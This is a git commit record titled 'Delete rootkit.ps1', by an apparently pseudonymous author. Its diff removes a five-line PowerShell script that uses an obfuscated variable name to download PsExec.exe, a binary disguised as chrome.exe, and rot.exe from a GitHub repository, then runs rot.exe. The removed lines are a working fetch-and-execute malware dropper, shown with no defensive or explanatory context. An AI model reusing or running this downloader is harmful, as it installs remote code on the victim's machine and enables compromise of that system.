716b78c3d9a4f95c406099dcf235a3c9de8b3a95
Ccgnnz19 <anonymous.spoof.1973@gmail.com>
2022-03-11 23:38:15 +0100

    Delete rootkit.ps1

--- rootkit.ps1
+++
@@ -1,5 +0,0 @@
-$fSiOVdcl99 = new-object System.Net.WebClient
-$fSiOVdcl99.DownloadFile('https://github.com/Ccgnnz19/shekksl/raw/main/PsExec.exe','PsExec.exe')
-$fSiOVdcl99.DownloadFile('https://github.com/Ccgnnz19/shekksl/raw/main/chrome.exe','chrome.exe')
-$fSiOVdcl99.DownloadFile('https://github.com/Ccgnnz19/shekksl/raw/main/rot.exe','rot.exe')
-Start-Process -FilePath "rot.exe"
